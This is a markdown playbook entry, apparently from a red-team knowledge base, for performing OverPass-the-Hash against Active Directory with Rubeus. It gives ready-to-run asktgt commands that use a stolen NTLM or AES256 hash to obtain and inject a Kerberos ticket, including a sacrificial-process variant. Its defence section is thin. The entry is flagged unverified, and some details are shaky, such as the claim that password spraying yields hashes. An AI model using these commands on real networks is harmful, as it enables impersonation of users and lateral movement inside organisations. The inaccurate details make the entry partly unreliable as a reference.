---
id: c0ff5de5-f6fa-4ad1-aeb1-a44f7b036d6b
name: OverPass-the-Hash with Rubeus
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.162198+00:00'
updated_at: '2023-04-10T20:26:24.155649+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Hash|T1075 - Pass the Hash]]'
tags:
- '[[Active Directory Attacks]]'
- '[[OverPass-the-Hash (pass the key)]]'
- '[[Using Rubeus]]'
commands:
- '[[Pass Ticket to sacrificial hidden process]]'
- '[[Request TGT using AES256HASH]]'
- '[[Request TGT using NTLMHASH]]'
---

# OverPass-the-Hash with Rubeus

## Summary

OverPass-the-Hash is a technique used to obtain access to a target system by using the NTLM hash of a user's password instead of the actual password. Rubeus is a tool that can be used to perform this attack. This technique is often used in conjunction with other techniques such as lateral movement 

## Description

# Description

OverPass-the-Hash is a technique used to obtain access to a target system by using the NTLM hash of a user's password instead of the actual password. Rubeus is a tool that can be used to perform this attack. This technique is often used in conjunction with other techniques such as lateral movement and privilege escalation to gain access to sensitive data or systems.

To perform this attack, the attacker must first obtain the NTLM hash of a user's password. This can be done through various means such as password spraying or using a tool like Mimikatz. Once the hash is obtained, the attacker can use Rubeus to request a Ticket Granting Ticket (TGT) as the target user and pass it to their current session. This allows the attacker to authenticate as the target user and access resources that the user has access to.

## Requirements

1. Access to a domain-joined system

1. Credentials of a user with local admin privileges

1. Rubeus tool installed on the system

## Defense

1. Implement strong password policies and multi-factor authentication to prevent the theft of user credentials

1. Monitor for suspicious activity such as failed login attempts and unusual network traffic

1. Use tools such as Windows Defender ATP or Sysmon to detect and respond to OverPass-the-Hash attacks

## Objectives

1. Obtain access to a target system

1. Authenticate as a target user

1. Access resources that the target user has access to

# Instructions

1. In order to request a TGT as a target user and pass it to the current session, follow these instructions:

1. Open a command prompt.
2. Navigate to the directory containing Rubeus.exe.
3. Execute the following command to request a TGT using the RC4 hash:

.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

Note: Replace [NTLMHASH] with the NTLM hash of the target user.

4. Alternatively, execute the following command to request a TGT using the AES256 hash:

.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt

Note: Replace [AES256HASH] with the AES256 hash of the target user.

5. If you have elevated privileges, you can pass the ticket to a sacrificial hidden process using the following command:

.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe

Note: Replace [NTLMHASH] with the NTLM hash of the target user and ensure that the specified sacrificial process exists on the system.

**Code**: [[# Request a TGT as the target user and pass it int]]

> This command allows you to request a Ticket Granting Ticket (TGT) as a target user and pass it to the current session. The TGT can then be used to request service tickets for various resources on the network. The command provides two options for requesting the TGT: using the RC4 hash or the AES256 hash. Additionally, if you have elevated privileges, you can pass the ticket to a sacrificial hidden process, which can be used to steal the token from that process.

**Command** ([[Request TGT using NTLMHASH]]):

```bash
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
```

**Command** ([[Request TGT using AES256HASH]]):

```bash
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
```

**Command** ([[Pass Ticket to sacrificial hidden process]]):

```bash
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[Pass Ticket to sacrificial hidden process]]
- [[Request TGT using AES256HASH]]
- [[Request TGT using NTLMHASH]]

## Tags

- [[Active Directory Attacks]]
- [[OverPass-the-Hash (pass the key)]]
- [[Using Rubeus]]
